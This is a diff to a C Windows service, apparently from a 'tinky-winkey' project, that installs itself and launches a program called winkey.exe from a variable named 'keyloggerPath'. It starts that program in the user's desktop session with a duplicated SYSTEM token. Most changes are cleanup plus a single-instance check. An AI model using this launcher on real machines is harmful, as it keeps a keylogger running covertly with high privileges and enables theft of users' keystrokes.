@@ -1,9 +1,24 @@
+#define _WIN32_WINNT 0x0A00
+#define _WIN32_WINNT_WIN10_TH2 0x0A00
+#define _WIN32_WINNT_WIN10_RS1 0x0A00
+#define _WIN32_WINNT_WIN10_RS2 0x0A00
+#define _WIN32_WINNT_WIN10_RS3 0x0A00
+#define _WIN32_WINNT_WIN10_RS4 0x0A00
+#define _WIN32_WINNT_WIN10_RS5 0x0A00
+#define NTDDI_WIN10_CU 0x0A000004
+
+#pragma warning(push)
+#pragma warning(disable: 4820)
+
 #include <windows.h>
 #include <wtsapi32.h>
 #include <tlhelp32.h>
 #include <tchar.h>
 #include <strsafe.h>
 #include <stdio.h>
+
+#pragma warning(pop)
+
 #include "svc.h"
 
 SERVICE_STATUS			gSvcStatus;
@@ -49,19 +64,19 @@ int _tmain(int argc, TCHAR* argv[])
 	}
 }
 
-VOID SvcInstall()
+VOID SvcInstall(void)
 {
 	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
 	if (NULL == schSCManager)
 	{
-		printf("OpenSCManager failed (%d)\n", GetLastError());
+		printf("OpenSCManager failed (%ld)\n", GetLastError());
 		return;
 	}
 
 	TCHAR szPath[MAX_PATH];
 	if (!GetModuleFileName(NULL, szPath, MAX_PATH))
 	{
-		printf("GetModuleFileName failed (%d)\n", GetLastError());
+		printf("GetModuleFileName failed (%ld)\n", GetLastError());
 		return;
 	}
 
@@ -73,7 +88,7 @@ VOID SvcInstall()
 
 	if (schService == NULL)
 	{
-		printf("CreateService failed (%d)\n", GetLastError());
+		printf("CreateService failed (%ld)\n", GetLastError());
 	}
 	else
 	{
@@ -84,26 +99,26 @@ VOID SvcInstall()
 	CloseServiceHandle(schSCManager);
 }
 
-VOID SvcDelete()
+VOID SvcDelete(void)
 {
 	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
 	if (NULL == schSCManager)
 	{
-		printf("OpenSCManager failed (%d)\n", GetLastError());
+		printf("OpenSCManager failed (%ld)\n", GetLastError());
 		return;
 	}
 
 	SC_HANDLE schService = OpenService(schSCManager, SVCNAME, DELETE);
 	if (schService == NULL)
 	{
-		printf("OpenService failed (%d)\n", GetLastError());
+		printf("OpenService failed (%ld)\n", GetLastError());
 		CloseServiceHandle(schSCManager);
 		return;
 	}
 
 	if (!DeleteService(schService))
 	{
-		printf("DeleteService failed (%d)\n", GetLastError());
+		printf("DeleteService failed (%ld)\n", GetLastError());
 	}
 	else
 	{
@@ -114,26 +129,26 @@ VOID SvcDelete()
 	CloseServiceHandle(schSCManager);
 }
 
-VOID SvcStart()
+VOID SvcStart(void)
 {
 	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
 	if (NULL == schSCManager)
 	{
-		printf("OpenSCManager failed (%d)\n", GetLastError());
+		printf("OpenSCManager failed (%ld)\n", GetLastError());
 		return;
 	}
 
 	SC_HANDLE schService = OpenService(schSCManager, SVCNAME, SERVICE_START);
 	if (schService == NULL)
 	{
-		printf("OpenService failed (%d)\n", GetLastError());
+		printf("OpenService failed (%ld)\n", GetLastError());
 		CloseServiceHandle(schSCManager);
 		return;
 	}
 
 	if (!StartService(schService, 0, NULL))
 	{
-		printf("StartService failed (%d)\n", GetLastError());
+		printf("StartService failed (%ld)\n", GetLastError());
 	}
 	else
 	{
@@ -144,19 +159,19 @@ VOID SvcStart()
 	CloseServiceHandle(schSCManager);
 }
 
-VOID SvcStop()
+VOID SvcStop(void)
 {
 	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
 	if (NULL == schSCManager)
 	{
-		printf("OpenSCManager failed (%d)\n", GetLastError());
+		printf("OpenSCManager failed (%ld)\n", GetLastError());
 		return;
 	}
 
 	SC_HANDLE schService = OpenService(schSCManager, SVCNAME, SERVICE_STOP);
 	if (schService == NULL)
 	{
-		printf("OpenService failed (%d)\n", GetLastError());
+		printf("OpenService failed (%ld)\n", GetLastError());
 		CloseServiceHandle(schSCManager);
 		return;
 	}
@@ -164,7 +179,7 @@ VOID SvcStop()
 	SERVICE_STATUS ssStatus;
 	if (!ControlService(schService, SERVICE_CONTROL_STOP, &ssStatus))
 	{
-		printf("ControlService failed (%d)\n", GetLastError());
+		printf("ControlService failed (%ld)\n", GetLastError());
 	}
 	else
 	{
@@ -241,12 +256,20 @@ DWORD GetProcessIdByName(const TCHAR* processName)
 	return pid; // Return the PID if found, otherwise 0
 }
 
+BOOL IsProcessRunning(LPCTSTR processName)
+{
+	DWORD pid = GetProcessIdByName(processName);
+	return (pid != 0);
+}
+
 //
 // Purpose: 
 //   The service code
 //
 VOID SvcInit(DWORD dwArgc, LPTSTR* lpszArgv)
 {
+	(void)dwArgc;
+	(void)lpszArgv;
 	// Create an event. The control handler function, SvcCtrlHandler,
 	// signals this event when it receives the stop control code.
 
@@ -259,6 +282,13 @@ VOID SvcInit(DWORD dwArgc, LPTSTR* lpszArgv)
 	if (ghSvcStopEvent == NULL)
 	{
 		ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
+		return;
+	}
+
+	if (IsProcessRunning(TEXT("winkey.exe")))
+	{
+		// one winkey instance is already running, do not start another one
+		ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);
 		return;
 	}
 
@@ -292,7 +322,7 @@ VOID SvcInit(DWORD dwArgc, LPTSTR* lpszArgv)
 	si.cb = sizeof(si);
 	si.lpDesktop = TEXT("winsta0\\default");
 
-	TCHAR keyloggerPath[] = TEXT("C:\\Users\\User\\Desktop\\tinky-winkey\\winkey.exe");
+	TCHAR keyloggerPath[] = WINKEY_PATH;
 
 	if (!CreateProcessAsUser(
 		hDupToken,         // Token for the SYSTEM user
@@ -399,5 +429,5 @@ VOID ReportSvcStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHi
 
 VOID SvcReportEvent(LPTSTR szFunction)
 {
-	// Placeholder for event logging
+	printf("Error %s: %ld", szFunction, GetLastError());
 }
